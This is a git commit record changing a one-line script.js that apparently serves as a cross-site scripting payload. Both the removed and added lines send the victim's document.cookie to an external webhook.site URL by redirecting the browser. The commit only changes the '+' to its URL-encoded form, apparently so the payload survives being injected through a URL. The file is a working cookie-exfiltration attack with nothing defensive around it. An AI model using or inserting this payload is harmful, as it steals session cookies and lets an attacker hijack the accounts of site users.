7cf5a6a4d6c1d433c83f204f11b00261e446bc91
JASalgueiro <74070951+JASalgueiro@users.noreply.github.com>
2022-12-16 20:24:59 +0000

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-location.href = 'https://webhook.site/000e72c6-5de3-43ee-a160-9f1e70666225/?cookie='+document.cookie
+location.href = 'https://webhook.site/000e72c6-5de3-43ee-a160-9f1e70666225/?cookie='%2Bdocument.cookie
